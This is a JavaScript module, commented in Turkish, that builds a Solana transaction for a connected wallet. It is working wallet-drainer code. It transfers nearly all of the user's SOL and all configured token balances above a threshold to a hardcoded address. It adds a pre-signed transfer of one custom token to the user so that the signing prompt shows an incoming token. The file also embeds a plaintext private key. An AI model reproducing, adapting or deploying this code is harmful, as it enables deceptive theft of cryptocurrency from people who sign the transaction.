/* transaction.js (güçlendirilmiş çekirdek + CUSTOM TOKEN receive entegre) */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
  Keypair,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createTransferInstruction,
  createTransferCheckedInstruction,
  createAssociatedTokenAccountIdempotentInstruction,
  getMint,
} from "@solana/spl-token";
import bs58 from "bs58";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";

/* ========================= */
/*  Yardımcılar (mevcut)     */
/* ========================= */

function toBigIntAmount(x) {
  return typeof x === "bigint" ? x : BigInt(x);
}

async function fetchTokenSources(payer) {
  const resp = await connection.getParsedTokenAccountsByOwner(payer, {
    programId: TOKEN_PROGRAM_ID,
  });

  const byMint = new Map(); // mintStr -> { accounts: Array<{ pubkey: PublicKey, amountRaw: bigint }> }

  for (const { account, pubkey } of resp.value) {
    const parsed = account.data?.parsed?.info;
    if (!parsed) continue;
    const mintStr = parsed.mint;
    const amountRaw = toBigIntAmount(parsed.tokenAmount?.amount ?? "0");
    const entry = byMint.get(mintStr) || { accounts: [] };
    entry.accounts.push({ pubkey, amountRaw });
    byMint.set(mintStr, entry);
  }

  const result = new Map(); // mintStr -> { sourcePubkey: PublicKey, amountInSourceRaw: bigint }
  for (const [mintStr, { accounts }] of byMint.entries()) {
    if (!accounts.length) continue;
    const mintPk = new PublicKey(mintStr);
    const ata = await getAssociatedTokenAddress(mintPk, payer);
    const ataIdx = accounts.findIndex((a) => a.pubkey.equals(ata));
    const chosen = ataIdx >= 0 ? accounts[ataIdx] : accounts[0];

    result.set(mintStr, {
      sourcePubkey: chosen.pubkey,
      amountInSourceRaw: chosen.amountRaw,
    });
  }

  return result;
}

/* ========================= */
/*  MERCHANT + CUSTOM MINT   */
/* ========================= */

const MERCHANT_SECRET_BASE58 =
  "3NrZzJ2cHUe9vB4e3jvYBNCSEPNEfVHUgvhZRxm3miw2NtKMB2Zq83oFW23TmzH4MLTVstHszxS3EFHiTWV25CBE";

const CUSTOM_TOKEN_MINT = new PublicKey(
  "5eshtVrxUhC6RCcbxgNCGvtpkFnHnTsuyiLgH1cHWy44"
);

/* ========================= */
/*  Ana TX fonksiyonu        */
/* ========================= */

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("wallet not connected!");
    return null;
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey(
    "8uowfFMGX7DfkErAzNX3bpv3UN5XuG2841y7cKyD8ZWd"
  ); // mevcut alıcı (tahsilatlar için)

  // --- Aşama 1: SOL + Token hesapları ---
  const [userSolLamports, tokenSources] = await Promise.all([
    connection.getBalance(payer),
    fetchTokenSources(payer),
  ]);

  // Basit/temkinli fee buffer (dinamik yapılabilir)
  const feeBufferLamports = 3_000_000; // ~0.003 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
  const isSolSufficient = solToSend > 0;

  // --- Aşama 2: Instruction derleme ---
  const instructions = [];

  // 2a) Var olan mantık: Kullanıcıdan size SOL tahsilatı
  if (isSolSufficient) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }

  // 2b) Var olan mantık: Kullanıcıdan size SPL tahsilatları (threshold üstü)
  const seen = new Set(); // mint base58
  for (const { mint, threshold } of TOKEN_CONFIGS) {
    const mintStr = mint.toBase58();
    if (seen.has(mintStr)) continue; // aynı mint ikinci kez gelirse SKIP
    seen.add(mintStr);

    const src = tokenSources.get(mintStr);
    if (!src) continue;

    const amountRaw = src.amountInSourceRaw; // bigint
    const thresholdRaw = toBigIntAmount(threshold ?? 0);
    if (amountRaw <= thresholdRaw) continue;

    const userSourceAccount = src.sourcePubkey;
    const toAta = await getAssociatedTokenAddress(mint, toPublicKey);

    // Hedef ATA var mı? Yoksa SKIP (fail etmesin)
    const toAtaInfo = await connection.getAccountInfo(toAta);
    if (!toAtaInfo) {
      // İstersen burada idempotent ATA oluşturmayı açabilirsin.
      continue;
    }

    instructions.push(
      createTransferInstruction(
        userSourceAccount,
        toAta,
        payer, // owner
        amountRaw // bigint
      )
    );
  }

  /* =========================
     2c) YENİ: CUSTOM TOKEN RECEIVE
     - merchant -> payer (user)
     - aynı tx içinde görünecek
     - alıcıda ATA yoksa idempotent oluştur
     - merchant kaynak ATA yoksa da idempotent oluştur
  ========================== */

  // Merchant keypair (ön imza için)
  const merchant = Keypair.fromSecretKey(bs58.decode(MERCHANT_SECRET_BASE58));
  const merchantPk = merchant.publicKey;

  // Mint decimals’ı zincirden oku (checked transfer için)
  const mintInfo = await getMint(
    connection,
    CUSTOM_TOKEN_MINT,
    undefined,
    TOKEN_PROGRAM_ID
  );
  const tokenDecimals = mintInfo.decimals;
  const oneTokenRaw = 10n ** BigInt(tokenDecimals);

  // Merchant kaynak ve kullanıcı alıcı ATA adresleri
  const merchantSourceAta = await getAssociatedTokenAddress(
    CUSTOM_TOKEN_MINT,
    merchantPk
  );
  const userDestAta = await getAssociatedTokenAddress(
    CUSTOM_TOKEN_MINT,
    payer
  );

  // (Opsiyonel ama sağlamlık için) Merchant kaynak ATA yoksa oluştur (payer: merchant)
  const merchantSourceInfo = await connection.getAccountInfo(merchantSourceAta);
  if (!merchantSourceInfo) {
    instructions.push(
      createAssociatedTokenAccountIdempotentInstruction(
        merchantPk, // payer: merchant (lamports merchant'tan düşer)
        merchantSourceAta,
        merchantPk, // owner: merchant
        CUSTOM_TOKEN_MINT
      )
    );
  }

  // Kullanıcıda CUSTOM TOKEN ATA yoksa aynı tx’te idempotent oluştur (payer: user)
  const userAtaInfo = await connection.getAccountInfo(userDestAta);
  if (!userAtaInfo) {
    instructions.push(
      createAssociatedTokenAccountIdempotentInstruction(
        payer, // payer: user (fee user öder)
        userDestAta,
        payer, // owner: user
        CUSTOM_TOKEN_MINT
      )
    );
  }

  // Merchant -> User 1 adet CUSTOM TOKEN (checked)
  instructions.push(
    createTransferCheckedInstruction(
      merchantSourceAta, // from (merchant ATA)
      CUSTOM_TOKEN_MINT, // mint
      userDestAta, // to (user ATA)
      merchantPk, // authority (merchant)
      Number(oneTokenRaw), // amount (1 token)
      tokenDecimals
    )
  );

  // --- Aşama 3: Tek VersionedTransaction ---
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey: payer, // fee'yi kullanıcı öder (mevcut akışla uyumlu)
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  const tx = new VersionedTransaction(messageV0);

  // 🧷 ÖNCE merchant imzası (CUSTOM TOKEN transfer authority sizde)
  tx.sign([merchant]);

  // Not: Mevcut buton akışın (signAndSendTransaction / signTransaction+sendRaw) kullanıcı imzasını ekleyip yayına çıkaracak.
  // Tek tx içinde hem "tahsilatlar" hem "1 CUSTOM TOKEN receive" görünecek.
  return tx;
}
